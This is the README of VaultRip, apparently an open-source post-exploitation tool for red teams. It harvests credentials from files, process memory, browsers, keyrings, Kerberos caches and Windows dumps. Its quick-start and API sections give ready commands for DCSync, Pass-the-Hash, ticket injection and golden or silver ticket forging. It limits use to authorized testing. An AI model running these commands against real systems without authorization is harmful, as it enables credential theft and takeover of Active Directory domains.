# VaultRip

<!-- markdownlint-disable MD033 -->
<p align="left">
  <a href="LICENSE">
    <img src="https://img.shields.io/badge/License-AGPL--3.0-white?style=for-the-badge&logo=opensourceinitiative&logoColor=black" alt="License">
  </a>
  <a href="https://www.python.org/">
    <img src="https://img.shields.io/badge/Python-3.10+-black?style=for-the-badge&logo=python&logoColor=white" alt="Python">
  </a>
  <img src="https://img.shields.io/badge/Platform-Linux%20%7C%20macOS%20%7C%20WSL-white?style=for-the-badge&logo=linux&logoColor=black" alt="Platform">
  <a href="https://github.com/CommonHuman-Lab/vaultrip/releases">
    <img src="https://img.shields.io/badge/Version-0.1.0-black?style=for-the-badge&logo=semver&logoColor=white" alt="Version">
  </a>
  <img src="https://img.shields.io/badge/Post--Exploitation-Credential%20Harvesting-white?style=for-the-badge&logo=gnuprivacyguard&logoColor=black" alt="Post-Exploitation">
</p>
<!-- markdownlint-enable MD033 -->

**Post-exploitation credential harvesting and active attack engine** — six sweep modules across files, process memory, browsers, system keyrings, Kerberos ticket caches, and offline dumps, plus five active attack modules (DCSync, Pass-the-Hash, Pass-the-Ticket, golden ticket, silver ticket) hidden behind explicit opt-in flags. Pure Python.

```bash
# Kali / Debian / Ubuntu — venv required on externally-managed Python
python3 -m venv .venv && source .venv/bin/activate
pip install vaultrip
pip install vaultrip[impacket]  # + offline LSASS / SAM / NTDS.dit parsing
pip install vaultrip[attack]    # + active attack modules (DCSync, PTH, ticket forging)
```

Or from source:

```bash
git clone https://github.com/CommonHuman-Lab/vaultrip.git
cd vaultrip
python3 -m venv .venv && source .venv/bin/activate
pip install -e .
```

> Run it once. Get credentials from six surfaces.

---

## Why VaultRip

Post-exploitation tooling on Linux is fragmented — run `find` for credential files, grep process memory manually, use a separate tool for Kerberos, another for browser stores, another for LSASS dumps. VaultRip replaces the entire chain.

**One command, six surfaces.** A single `vaultrip ~` sweeps the filesystem for 55 known credential paths across 26 services, scans process memory via `/proc/*/mem`, reads browser credential databases, queries system keyrings, extracts Kerberos tickets from every ccache it finds, and optionally parses an offline dump — all in one pass, structured JSON out.

**Full feature set on Linux, core modules everywhere.** Process memory scanning (`/proc/*/mem`) and system keyrings (GNOME, kwallet) require Linux. File sweep, browser credentials, dump analysis, and SSH remote harvesting run on Linux, macOS, and WSL — anywhere Python 3.10 runs.

**Offline dump analysis without a live target.** LSASS minidumps, SAM hives, and NTDS.dit are parsed via pypykatz and impacket — NT hashes, LM hashes, and plaintext credentials extracted from a file, on any OS, with no access to the original machine required.

**Process memory without ptrace.** The memory module reads `/proc/<pid>/maps` and `/proc/<pid>/mem` directly — no `ptrace`, no debugging API, no process suspension. 34 credential patterns scan heap and anonymous regions of agents, browsers, and SSH sessions for material sitting in cleartext.

**Binary ccache and keytab parsing — no impacket required.** Kerberos ticket extraction uses a custom binary parser for MIT ccache v3/v4 and keytab v2 formats. Every ticket cache on the system is located (KRB5CCNAME, `/tmp/krb5cc_*`, `/var/lib/sss/db/`) and parsed without any external Kerberos dependency. Impacket only enters the picture for offline Windows dump analysis.

**Offline dump analysis built in.** Drop an LSASS minidump, SAM hive, or NTDS.dit — VaultRip identifies the format by magic bytes and dispatches to pypykatz (LSASS) or impacket (SAM/NTDS) to extract NT hashes, LM hashes, and plaintext credentials where available.

**SSH remote harvesting.** `--remote HOST` connects via the built-in SSH client, runs a battery of harvesting commands on the remote host, and parses output locally — no files dropped on the target.

**Active attack modules — opt-in only.** DCSync replicates an entire Active Directory credential database via DRSUAPI without touching disk. Pass-the-Hash executes arbitrary commands on Windows hosts using only an NT hash. Pass-the-Ticket injects a ccache into the current session via `KRB5CCNAME`. Golden and silver ticket forging constructs fully signed Kerberos tickets from a hash — no DC required for forging. All five modules are disabled by default and require explicit flags.

---

## What it covers

| Module | What it sweeps | Notes |
| --- | --- | --- |
| **Files** | `~/.ssh`, `~/.aws`, `~/.kube`, `.env`, git-credentials, Docker config, cloud tokens | 55 credential paths × 26 services; 34 regex patterns |
| **Memory** | `/proc/*/mem` — heap and anonymous regions of running processes | No ptrace; reads mapped regions directly |
| **Browser** | Chrome, Chromium, Edge, Brave, Firefox | SQLite `Login Data`; Firefox NSS decryption via `libnss3` |
| **System** | GNOME keyring, kwallet, git-credentials, Docker, `.pgpass`, `.netrc`, `.my.cnf` | |
| **Kerberos** | ccache files, keytab files, `KRB5CCNAME` env var | Custom binary parser — no external dependency |
| **Dumps** | LSASS minidump, SAM hive + SYSTEM hive, NTDS.dit | pypykatz + impacket (optional extra) |
| **DCSync** ⚠ | Replicate all AD credentials via DRSUAPI | Requires `--dcsync` + `vaultrip[attack]` |
| **Pass-the-Hash** ⚠ | Execute commands on Windows via NT hash | Requires `--pth` + `vaultrip[attack]` |
| **Pass-the-Ticket** ⚠ | Inject a ccache into the current session | Requires `--ptt` |
| **Ticket Forge** ⚠ | Golden / silver Kerberos ticket construction | Requires `--forge-golden` / `--forge-silver` + `vaultrip[attack]` |

---

## Quick start

```bash
# Sweep current user's home — all modules
vaultrip ~

# Files and browser only — fast, no memory or system keyring scan
vaultrip ~ --no-memory --no-system --no-kerberos

# Restrict memory scan to a single PID
vaultrip ~ --pid 1234

# Target a specific user (requires appropriate permissions)
vaultrip ~ --user www-data

# Full verbose output — show extracted credential values
vaultrip ~ -v

# Write findings to JSON
vaultrip ~ -o /tmp/findings.json

# Analyse an offline LSASS minidump (requires vaultrip[impacket])
vaultrip --dumps /tmp/lsass.dmp

# Analyse a SAM hive (SYSTEM hive must be in the same directory)
vaultrip --dumps /tmp/SAM

# Remote sweep via SSH key
vaultrip --remote 192.168.1.10 --ssh-user root --ssh-key ~/.ssh/id_rsa

# Remote sweep via password
vaultrip --remote 10.10.10.5 --ssh-user root --ssh-pass s3cr3t

# ⚠ DCSync — replicate all AD credentials from a DC
vaultrip --dcsync --dc 192.168.1.1 --domain corp.local \
         --attack-user Administrator --attack-hash <NT_HASH>

# ⚠ Pass-the-Hash — run whoami on a remote Windows host
vaultrip --pth --dc 192.168.1.50 --domain corp.local \
         --attack-user Administrator --attack-hash <NT_HASH>

# ⚠ Forge a golden ticket and inject it into the current session
vaultrip --forge-golden --ptt \
         --domain corp.local --domain-sid S-1-5-21-... \
         --krbtgt-hash <NT_HASH> --attack-user Administrator

# ⚠ Forge a silver ticket for a specific SPN
vaultrip --forge-silver --forge-silver-spn cifs/server.corp.local \
         --domain corp.local --domain-sid S-1-5-21-... \
         --attack-hash <SERVICE_NT_HASH> --attack-user Administrator
```

Run with **no arguments** for interactive wizard mode (passive modules only).

---

## Python API

```python
from vaultrip import scan, ScanOptions

result = scan("~", options=ScanOptions(memory=False, browser=False))

print(f"{result.total_findings} credential(s) in {result.duration_s:.1f}s")

for f in result.files:
    print(f"  [{f.service}] {f.credential_type} — {f.path}")

for f in result.kerberos:
    print(f"  [kerberos] {f.principal} → {f.service}  expires={f.expires}")

for f in result.dumps:
    nt = f"NT={f.nt_hash}" if f.nt_hash else ""
    print(f"  [{f.dump_type}] {f.domain or ''}/{f.username}  {nt}")

# Attack modules — explicit opt-in
from vaultrip import scan, ScanOptions

result = scan("~", options=ScanOptions(
    dcsync=True,
    dc_host="192.168.1.1",
    ad_domain="corp.local",
    attack_user="Administrator",
    attack_hash="<NT_HASH>",
))
for f in result.dcsync:
    print(f"  {f.domain}\\{f.username}  NT={f.nt_hash}")
```

---

## Options

| Option | Default | Description |
| --- | --- | --- |
| `target` | `~` | Directory to sweep (positional) |
| `--no-local` | off | Skip filesystem sweep |
| `--no-memory` | off | Skip process memory scan |
| `--no-browser` | off | Skip browser credential stores |
| `--no-system` | off | Skip system keyrings |
| `--no-kerberos` | off | Skip Kerberos ticket extraction |
| `--dumps PATH` | — | Parse offline dump: LSASS minidump / SAM hive / NTDS.dit |
| `--user USER` | current | Restrict sweep to a specific Unix user's home |
| `--pid PID` | all | Restrict memory scan to a single process |
| `--remote HOST` | — | SSH target for remote harvesting |
| `--ssh-user USER` | — | SSH username |
| `--ssh-key PATH` | — | SSH private key path |
| `--ssh-pass PASS` | — | SSH password (prefer `--ssh-key`) |
| `--ssh-port PORT` | `22` | SSH port |
| `-o FILE` | — | Write findings as JSON |
| `-v` | off | Verbose — show extracted credential values |
| `--timeout SEC` | `30` | Per-operation timeout |

**Attack flags** — all disabled by default, all require `vaultrip[attack]` unless noted:

| Option | Description |
| --- | --- |
| `--dcsync` | DCSync via DRSUAPI — replicate AD credentials |
| `--pth` | Pass-the-Hash — execute `--attack-cmd` on `--dc` host |
| `--ptt` | Pass-the-Ticket — inject `--ptt-ticket` ccache/kirbi (no extra required) |
| `--forge-golden` | Forge a Kerberos golden ticket (TGT) |
| `--forge-silver` | Forge a silver ticket for `--forge-silver-spn` |
| `--dc HOST` | Domain Controller address |
| `--domain DOMAIN` | Active Directory domain name |
| `--domain-sid SID` | Domain SID `S-1-5-21-...` (ticket forging) |
| `--krbtgt-hash HASH` | krbtgt NT hash (golden ticket) |
| `--attack-user USER` | Username to impersonate |
| `--attack-hash HASH` | NT hash for PTH / DCSync / silver ticket |
| `--attack-cmd CMD` | Command to run after PTH (default: `whoami`) |
| `--ptt-ticket PATH` | Path to `.ccache` or `.kirbi` to inject |
| `--forge-silver-spn SPN` | SPN for silver ticket, e.g. `cifs/host.domain.local` |

---

## Install from source

```bash
git clone https://github.com/CommonHuman-Lab/vaultrip.git
cd vaultrip
python3 -m venv .venv && source .venv/bin/activate
pip install -e .
pip install -e ".[dev]"        # + pytest, mypy, ruff
pip install -e ".[impacket]"   # + LSASS / SAM / NTDS parsing
pip install -e ".[attack]"     # + DCSync / PTH / ticket forging
```

Requires Python 3.10+. On Kali and other Debian-based systems, the virtual env is required — system Python is externally managed.

---

## Legal & Ethical Use

Only run VaultRip against systems you own or have explicit written authorization to test. Authorized use includes penetration testing engagements, red team operations, CTF competitions, and internal security assessments.

The active attack modules — DCSync, Pass-the-Hash, and ticket forging — are disabled by default. Enable them only within a clearly scoped and authorized engagement.

The authors accept no liability for unauthorized or illegal use.

---

## License

Licensed under the [AGPLv3](LICENSE).
You are free to use, modify, and distribute this software. If you run it as a service or distribute it, the source must remain open.

For commercial licensing, contact the author.
